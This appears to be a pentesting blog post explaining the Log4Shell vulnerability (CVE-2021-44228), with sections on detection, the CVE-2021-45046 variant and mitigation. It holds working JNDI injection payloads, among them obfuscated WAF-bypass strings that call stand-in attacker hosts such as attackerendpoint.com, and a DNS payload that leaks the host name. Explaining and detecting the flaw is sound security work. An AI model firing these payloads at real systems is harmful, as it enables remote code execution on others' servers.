---
layout: single
title: '<span class="post">Log4Shell (CVE-2021-44228) Explanation of vulnerability | Pentesting </span>'
excerpt: "The Log4Shell vulnerability has been revolutionising companies since it was discovered, in this post I will tell you what it is, how to detect it, exploit it and mitigate it."
date: 2021-12-16
header:
  teaser: /assets/images/log4shell/logo.png
  teaser_home_page: true
  image_description: log4shell
categories:
  - post
  - article
tags:  
  - log4shell
  - cve-2021-44228
  - log4j
  - java
  - zero-day
  - cybersecurity
show_time: true
toc: true
toc_label: "Content"
toc_sticky: true
---

# Contextualisation

The RCE vulnerability occurs because the `log4j2.formatMsgNoLookups` function in the JNDI library, which is used to access external resources or Java references, does not perform a correct control of the loaded value, then with LDAP we indicate where we want to access. So, the attacker can send a request, either:

- To obtain resources through code injection previously encoded in Base 64.
- To obtain a reverse shell connection by remotely uploading a file written in Java and already compiled, `Exploit.class`, which will be interpreted when uploaded by the server.
- Execution of arbitrary code on the target server.

As the server downloads, stores and loads whatever it gets from the external resource (in the case of an attacker, its own server).

# Exploit

The payload commonly takes the format `${jndi:ldap://IP_ATACKER_SERVER/file}`.

- The attacker sends a manipulated parameter (e.g. ?x=) to the server (via HTTP or another protocol). For example the following string: `${jndi:ldap://malicious-site.com/exp}` via a GET request.
- The vulnerable server receives the request with the *payload*.
- The vulnerability in *Log4j* allows the *payload* to be executed and the server makes a request to the attacker's site. The request is made via the JNDI protocol.
- The response from the attacker's server contains a remote Java file (e.g. an *exploit.class* file) that is injected into the process running on the vulnerable server.
- Code is executed on the vulnerable server.

<a href="/assets/images/log4shell/log4shell/exploit.png"><img src="/assets/images/log4shell/exploit.png" alt="log4shell explotation"></a>

Although the payload can be intercepted by a WAF easily, it can be bypassed in any number of ways:

```
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}

${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}

${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}

${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}

${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}

${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}

${${::-j}ndi:rmi://attackerendpoint.com/}
```

These consist of varying and trying not to send the payload in a clear way.

There is also another protocol that can be exploited, `rmi` which can be used with the `mashalsec` utility and is seen in the last payload shown.

<a href="/assets/images/log4shell/defenses.png"><img src="/assets/images/log4shell/defenses.png" alt="log4shell defenses"></a>

> Note: It must be taken into account that each 4j product affected (Apache, Cisco, RedHat, Citrix, etc... ) is exploited differently depending on its configuration and network architecture (in most of them it is enough to modify the payload to bypass possible WAFs).
> 

# Detection

To detect the vulnerability without causing damage to the asset, we must perform the steps shown in the Exploitation section. But trying to use a payload that we simply access to our server, for example: `${jndi:ldap://IP_SERVER_ATACANTE}`.

Subsequently, when launched with either that payload or a bypass variant, if we receive a request on our server, we will be able to confirm that our target is vulnerable.

There are several options when intercepting the request:

- Mount HTTP server to capture incoming requests (e.g. with Python) to confirm that the request to the server we were targeting in the injected code has been received.
- We can use a DNS server to help us, so that by encoding the name of the target in the request, the request is received with the name of the affected host, thus confirming that it is vulnerable.
    
    Example: `${jndi:ldap://x${hostName}.dns1.myserver.com/a}`.
    
- Using Nuclei and using `interactsh` as the server receiving requests.
    - Link to Nuclei template(https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-44228.yaml)

# Vulnerability variants

- CVE-2021-45046
    
  * This variant allows to generate a denial of service (DoS) attack, this vulnerability has a relatively low severity and a high complexity of exploitation.
    
  * This variant exploits the same JNDI vulnerability, but unlike Log4Shell, this one, thanks to the control over the Thread Context Map (TCM) when not using a default design pattern, can create malicious input data through a JNDI search pattern that leads to a DoS attack.
    

# Affected Versions

Log4j 2.0 to 2.14.1

# Mitigation

Upgrade the library to `Log4j 2.16`.

- **CVE-2021-44228:**
    - The affected functionality has been completely removed.
- **CVE-2021-45046:**
    - Removed support for message search patterns and disabled JNDI functionality by default.
